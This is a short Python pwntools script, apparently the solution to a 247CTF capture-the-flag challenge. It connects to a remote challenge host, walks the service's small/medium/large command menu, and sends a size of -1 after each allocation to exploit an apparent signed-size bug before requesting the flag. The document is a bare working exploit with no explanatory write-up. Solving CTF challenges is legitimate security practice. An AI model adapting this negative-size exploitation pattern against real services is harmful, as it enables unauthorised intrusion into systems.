from pwn import *

p = remote('277362b6339a23dc.247ctf.com', 50392)

def small(p, size, data):
    print p.recvuntil('Enter command:\n')
    p.sendline('small')
    print p.recv()
    p.sendline(size)
    print p.recv()
    p.sendline(data)

def medium(p, size, data):
    print p.recvuntil('Enter command:\n')
    p.sendline('medium')
    print p.recv()
    p.sendline(size)
    print p.recv()
    p.sendline(data)

def large(p, size, data):
    print p.recvuntil('Enter command:\n')
    p.sendline('large')
    print p.recv()
    p.sendline(size)
    print p.recv()
    p.sendline(data)

small(p, '10', 'A')
print p.recvuntil('Enter command:\n')
p.sendline('small')
print p.recv()
p.sendline('-1')
medium(p, '10', 'A')
print p.recvuntil('Enter command:\n')
p.sendline('medium')
print p.recv()
p.sendline('-1')
large(p, '10', 'A')
print p.recvuntil('Enter command:\n')
p.sendline('large')
print p.recv()
p.sendline('-1')
print p.recv()
p.sendline('flag')
print p.recv()
